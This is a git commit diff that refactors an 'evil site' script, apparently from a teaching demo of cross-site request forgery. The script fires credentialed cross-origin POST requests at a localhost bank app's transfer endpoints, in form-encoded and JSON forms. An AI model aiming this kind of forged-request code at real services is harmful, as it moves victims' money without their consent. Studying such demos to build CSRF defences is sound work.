240d135081c7c6365d99e83c80f236137b592ef1
Brook Li <emcdynamicist@gmail.com>
2019-08-07 11:22:49 -0400

    Cleaned up coding style of evil attack site and rearranged the sections.

--- evil-site/ajax-call.js
+++ evil-site/ajax-call.js
@@ -1,13 +1,21 @@
-DOMAIN = 'http://localhost:3000'
+const DOMAIN = 'http://localhost:3000'
+const PARAMS = {
+  recipientId: 2,
+  amount: 1
+}
 
-function postCallWithCreds(url){
-  const paramsString = 'recipientId=2&amount=1'
+function postCallWithCreds(url, json){
+  const body = json ?
+    JSON.stringify(PARAMS) :
+    new URLSearchParams(PARAMS).toString()
+  const contentType = json ?
+    'application/json' : 'application/x-www-form-urlencoded'
   const requestObj = new Request(url)
   const initObj = {
     method: 'POST',
-    body: paramsString,
+    body,
     headers: {
-      'Content-Type': 'application/x-www-form-urlencoded'
+      'Content-Type': contentType
     },
     credentials: 'include'
   }
@@ -26,27 +34,7 @@ document.getElementById('secured-ajax-button').addEventListener(
   () => postCallWithCreds(`${DOMAIN}/secured/account/transfer`)
 )
 
-function jsonPostCallWithCreds(url){
-  const paramsObj = {
-    recipientId: 2,
-    amount: 1
-  }
-  const paramsString = JSON.stringify(paramsObj)
-  const requestObj = new Request(url)
-  const initObj = {
-    method: 'POST',
-    body: paramsString,
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    credentials: 'include'
-  }
-  fetch(requestObj, initObj).then(response => {
-    console.log(response)
-  })
-}
-
 document.getElementById('json-ajax-button').addEventListener(
   'click',
-  () => jsonPostCallWithCreds(`${DOMAIN}/api/account/transfer`)
+  () => postCallWithCreds(`${DOMAIN}/api/account/transfer`, true)
 )
